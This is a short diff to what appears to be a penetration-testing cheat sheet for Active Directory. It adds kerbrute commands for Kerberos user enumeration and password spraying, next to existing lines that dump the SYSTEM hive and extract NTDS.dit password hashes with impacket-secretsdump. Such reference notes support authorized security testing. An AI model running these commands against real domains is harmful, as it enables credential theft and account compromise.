@@ -628,3 +628,14 @@ reg.exe save hklm\system c:\system.bak
 ```
 impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 ```
+
+# `kerbrute` (For example NTLM is disabled)
+- Check users
+```
+./kerbrute userenum -d domain.local --dc dc01.domain.local users.txt
+```
+- Password spraying
+```
+./kerbrute passwordspray -d domain.local --dc dc01.domain.local password.txt username
+```
+
